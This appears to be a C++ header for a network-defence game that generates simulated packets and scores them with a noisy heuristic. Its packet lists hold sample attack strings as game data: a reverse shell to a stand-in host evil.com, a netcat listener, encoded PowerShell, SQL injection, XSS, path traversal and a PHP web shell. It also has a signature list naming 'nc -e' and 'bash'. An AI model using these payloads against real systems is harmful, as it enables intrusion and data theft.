#pragma once
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <algorithm>
#include "Packet.h"

struct PacketLogEntry {
    Packet pkt;
    int threat_score;
    std::chrono::steady_clock::time_point timestamp;
    bool handled = false;
    bool leaked  = false;
};

class PacketGenerator {
public:
    PacketGenerator() : rng_(std::random_device{}()) {
        // Даем игроку 2 секунды на старте
        next_packet_time_ = std::chrono::steady_clock::now() + std::chrono::seconds(2);
    }

    void set_wave(int wave) {
        current_wave_ = wave;
        difficulty_multiplier_ = 1.0f + (wave - 1) * 0.25f;
    }

    bool ready(std::chrono::steady_clock::time_point now) const { return now >= next_packet_time_; }

    int ms_until_next() const {
        auto now = std::chrono::steady_clock::now();
        if (now >= next_packet_time_) return 0;
        return (int)std::chrono::duration_cast<std::chrono::milliseconds>(next_packet_time_ - now).count();
    }

    Packet generate() {
        schedule_next();
        int r = roll(100);
        if (r < 40) return make_legitimate();
        if (r < 65) return make_malicious();
        if (r < 85) return make_web_attack();
        return make_anomaly();
    }

    int heuristic_threat_score(const Packet& p) {
        int score = 0;
        if (p.port == 4444 || p.port > 10000) score += 40;
        if (p.source_ip.find("192.168.6.6") != std::string::npos) score += 30;
        
        // Список сигнатур
        static const std::vector<std::string> sigs = {"DROP", "UNION", "nc -e", "bash", "alert", "../"};
        for (const auto& s : sigs) if (p.payload.find(s) != std::string::npos) { score += 30; break; }

        // Погрешность сканера (Lying AI)
        int noise = 10 + (current_wave_ * 5);
        std::uniform_int_distribution<int> dist(-noise, noise);
        return std::clamp(score + dist(rng_), 0, 100);
    }

private:
    std::mt19937 rng_;
    std::chrono::steady_clock::time_point next_packet_time_;
    int current_wave_ = 1;
    float difficulty_multiplier_ = 1.0f;

    int roll(int max) { return std::uniform_int_distribution<int>(0, max - 1)(rng_); }

    void schedule_next() {
        int min_ms = std::max(500, (int)(2500 / difficulty_multiplier_));
        int max_ms = std::max(1000, (int)(5500 / difficulty_multiplier_));
        std::uniform_int_distribution<int> dist(min_ms, max_ms);
        next_packet_time_ = std::chrono::steady_clock::now() + std::chrono::milliseconds(dist(rng_));
    }

    Packet make_legitimate() {
        static std::vector<std::string> ips = {"8.8.8.8", "1.1.1.1", "172.16.1.5", "10.0.0.1"};
        static std::vector<std::pair<int, std::string>> ports = {{80, "HTTP"}, {443, "HTTPS"}, {53, "DNS"}};
        auto p = ports[roll(ports.size())];
        return {ips[roll(ips.size())], p.first, p.second, "GET /index.html HTTP/1.1", false};
    }

    Packet make_malicious() {
        static std::vector<std::string> payloads = {
            "SQLi: '; DROP TABLE users; --", "RCE: bash -i >& /dev/tcp/evil.com/4444", 
            "SHELL: nc -lvnp 4444", "CMD: powershell -enc JABjID0AbgBlAHcALQ..."
        };
        return {"192.168.6.6", 4444, "TCP", payloads[roll(payloads.size())], true};
    }

    Packet make_web_attack() {
        static std::vector<std::string> payloads = {
            "XSS: <script>alert(1)</script>", "LFI: ../../../../etc/passwd",
            "Bypass: ' OR 1=1 --", "PHP: <?php system($_GET['c']); ?>"
        };
        return {"10.0.0.6", 80, "HTTP", payloads[roll(payloads.size())], true};
    }

    Packet make_anomaly() {
        return {"45.33.32.156", 53, "HTTPS", "ENCRYPTED_TUNNEL_DATA", true};
    }
};